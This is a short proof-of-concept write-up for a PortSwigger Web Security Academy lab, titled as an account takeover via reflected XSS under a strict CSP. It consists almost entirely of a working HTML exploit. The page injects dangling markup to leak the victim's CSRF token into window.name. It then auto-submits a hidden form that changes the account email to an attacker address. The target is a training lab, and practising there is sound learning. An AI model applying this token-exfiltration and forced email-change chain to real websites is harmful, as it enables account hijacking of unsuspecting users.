# PortSwigger Poc - Reflected XSS protected by very strict CSP, with dangling markup attack  - Account Takeover [ CSRF Token Exifiltrate + Change Email Auto Submit ]
https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack

```html
<html>
  <body>
    <script>
      if (window.name) {
        var token = window.name.split('value="')[1].split('">')[0];
      } else {
        location = "https://0ac600ca04fafg28864349f200af0085.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-0aee001404a9fe52863f483d017c00c1.exploit-server.net/nowak%22%3EClick%20Me%3C/a%3E%3Cbase%20target=%27%3E";
      }
    </script>
    <script>
      document.addEventListener('DOMContentLoaded', function() {
        document.forms[0].csrf.value = token;
        document.forms[0].submit();
      });
    </script>
    <form action="https://0ac600ca04fafg28864349f200af0085.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@evil-user.net" />
      <input type="hidden" id="csrf" name="csrf" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
